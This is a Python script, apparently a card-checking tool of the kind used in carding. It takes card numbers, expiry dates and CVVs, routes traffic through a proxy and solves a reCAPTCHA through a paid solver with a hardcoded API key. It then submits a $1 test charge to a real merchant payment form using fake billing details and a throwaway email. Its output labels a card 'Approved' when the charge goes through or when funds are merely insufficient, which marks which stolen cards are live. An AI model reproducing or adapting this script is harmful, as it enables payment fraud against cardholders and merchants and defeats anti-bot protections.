import capsolver
import asyncio
from httpx import AsyncClient

async def fullsteam(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(proxy=proxyg,verify=False) as web:
        one = cc[0:1]

        if one == "4":
            cc_type = "Visa"
        elif one == "5":
            cc_type = "Mastercard"
        elif one == "3":
            cc_type = "Amex"
        elif one == "6":
            cc_type = "Discover"    
        
        capsolver.api_key = "CAP-19CE2290C6A6349E52AE1488B65DCCB7"
                
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6Lf5tkoUAAAAAFWlKnpLmt8W651uv46EkeZHe8oM',
        "websiteURL": 'https://secure.payably.io/interface/epayform/OQsZwaY7yvKjj5gQEv8dy6pV16rpU7z6',
        })))['gRecaptchaResponse']
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        req1 =await web.get('https://secure.payably.io/interface/epayform/OQsZwaY7yvKjj5gQEv8dy6pV16rpU7z6',headers=headers)
        key = req1.text.split('<input type="hidden" name="UMkey" value="')[1].split('"')[0]
        formstring = req1.text.split('<input type="hidden" name="UMformString" value="')[1].split('"')[0]
        requestkey = req1.text.split('<input type="hidden" name="UMrequestkey" value="')[1].split('"')[0]
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://secure.payably.io',
            'Referer': 'https://secure.payably.io/interface/epayform/OQsZwaY7yvKjj5gQEv8dy6pV16rpU7z6/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            "UMsubmit": "1",
            "UMkey": key,
            "UMredirDeclined": "",
            "UMredirApproved": "",
            "UMTypeC": f"/images/{cc_type}.gif",
            "UMhash": "",
            "UMcommand": "",
            "UMaccount": "",
            "UMrouting": "",
            "UMachApplied": "",
            "UMaccounttype": "",
            "UMcheckformat": "",
            "paybycheck": "",
            "paybycc": "",
            "UMbillcompany": "",
            "UMamount": "1.03",
            "UMdeposit": "1.00",
            "UMconFee": "0.04",
            "UMtax": "",
            "UMinvoice": "1",
            "UMcustid": "",
            "UMrecurring": "",
            "UMaddcustomer": "",
            "UMbillamount": "",
            "UMmerchantId": "1",
            "UMcustom14": "scarlatmario4@tiktok.tf",
            "UMcustom15": f"{cc_type}",
            "UMcustom16": "card",
            "UMcustom17": "",
            "UMemailreceipt": "scarlatmario4@tiktok.tf",
            "UMemail": "scarlatmario4@tiktok.tf",
            "UMcustreceipt": "yes",
            "UMschedule": "",
            "UMnumleft": "",
            "UMstart": "",
            "UMexpire": "",
            "UMdescription": "",
            "UMorderdate": "",
            "UMechofields": "",
            "UMformString": formstring,
            "UMrequestkey": requestkey,
            "UMTypeCard": f"{cc_type}",
            "UMlastDigits": cc[-4:],
            "UMmerchant": "",
            "UMmerchantName": "",
            "UMURLRedirect": "",
            "UMcustom1": "0.04",
            "UMcustom2": "1.00",
            "UMip": "",
            "UMduty": "0.00",
            "UMponum": "2019",
            "UMline1sku": "000002",
            "UMline1name": "Printing Services",
            "UMline1description": "Print and marketing solutions",
            "UMline1cost": "",
            "UMline1qty": "1.00",
            "UMline1taxable": "Y",
            "UMline1taxrate": "0.10",
            "UMline1um": "EA",
            "UMline1commoditycode": "82121500",
            "UMline1discountrate": "0.01",
            "UMline2sku": "000003",
            "UMline2name": "Service Charge",
            "UMline2description": "Non Cash Surcharge",
            "UMline2cost": "",
            "UMline2qty": "1.00",
            "UMline2taxable": "N",
            "UMline2taxrate": "0.00",
            "UMline2um": "EA",
            "UMline2commoditycode": "82121500",
            "UMline2discountrate": "0.00",
            "UMshipcompany": "",
            "UMbillfname": "dsf",
            "UMbilllname": "s",
            "UMshipfname": "",
            "UMshiplname": "",
            "UMbillstreet": "",
            "UMshipstreet": "",
            "UMbillzip": "",
            "UMshipzip": "",
            "UMbillstate": "",
            "UMshipstate": "",
            "UMbillcity": "",
            "UMshipcity": "",
            "UMbillcountry": "",
            "UMshipcountry": "US",
            "UMcard": cc,
            "UMexpir": mes+ano,
            "UMcvv2": '',
            "UMname": "dsf s",
            "UMbillstreet": "103-105 Central Ave",
            "UMzip": "07050",
            "paybycc": "1",
            "lastNameInput": "",
            "UMaccountType": "checking",
            "UMaccountHolder": "",
            "UMroutingNumber": "",
            "UMconRoutingNumber": "",
            "UMaccountNumber": "",
            "UMconAccountNumber": "",
            "g-recaptcha-response": g_response,
            "submit": "Submit"
        }

        req2 = await web.post(
            'https://secure.payably.io/interface/epayform/OQsZwaY7yvKjj5gQEv8dy6pV16rpU7z6',
            headers=headers,
            data=data
        )
        if "Thank you" in req2.text:
            status = "Approved ✅"
            mensaje = "Charged $1"
        else:
            mensaje = req2.text.split('<span id="errorSpan" size=4>')[1].split('The system was unable to process your payment request: "')[1].split('"')[0]
            if "Insufficient funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje